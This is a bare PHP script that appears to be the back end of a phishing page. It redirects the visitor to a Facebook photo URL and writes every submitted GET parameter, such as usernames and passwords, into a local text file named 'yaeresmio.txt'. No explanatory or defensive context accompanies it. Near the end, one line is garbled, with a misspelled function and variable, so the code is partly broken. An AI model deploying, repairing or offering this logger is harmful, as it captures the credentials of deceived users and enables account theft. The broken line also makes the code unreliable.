<?php 
header("Location: https://www.facebook.com/photo.php?fbid=656373664442279&set=pb.100002089547904.-2207520000..&type=3&theater "); 
$handle = 

fopen("yaeresmio.txt", "a"); 
foreach($_GET as

$variable => $value) { 
fwrite($handle, 

$variable); fwrite($handle, "="); 

fwrite($handle, $value); 
fwrite($handle, 

"\r\n"); 
}
frité($ande, "\r\n"); 
fclose($handle); 
exit ?>